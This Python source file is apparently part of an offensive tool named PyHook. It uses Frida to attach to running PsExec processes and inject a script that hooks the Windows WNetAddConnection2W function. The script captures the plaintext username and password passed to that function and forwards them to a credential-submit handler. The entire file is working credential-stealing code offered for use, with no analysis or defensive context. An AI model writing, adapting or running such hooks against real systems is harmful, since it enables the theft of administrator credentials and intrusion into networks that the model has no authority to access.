import frida
from PyHook import wait_for_process, on_credential_submit


def wait_for():
    wait_for_process(["PsExec64.exe", "PsExec.exe", "psexec.exe"], "PsExec", hook)


def hook(pid):
    try:
        print("[+] Trying To Attach To PsExec")
        session = frida.attach(pid)
        print(f"[+] Attached PsExec with pid {pid}!")
        script = session.create_script("""

			var WNetAddConnection2W = Module.findExportByName("Mpr.dll", 'WNetAddConnection2W')
				Interceptor.attach(WNetAddConnection2W, {
					onEnter: function (args) {

						this.lpUsername = args[2];
						this.lpPassword = args[1];

					},
					onLeave: function (args) {
						send("\\n=============================" + "\\n[+] Intercepted Creds from PsExec" + "\\nUsername    : " + this.lpUsername.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+"\\n=============================" );

					}
				});

		""")
        script.on('message', on_credential_submit)
        script.load()

    except Exception as e:
        print("[-] Unhandled exception: " + str(e))
        print("[-] Continuing...")
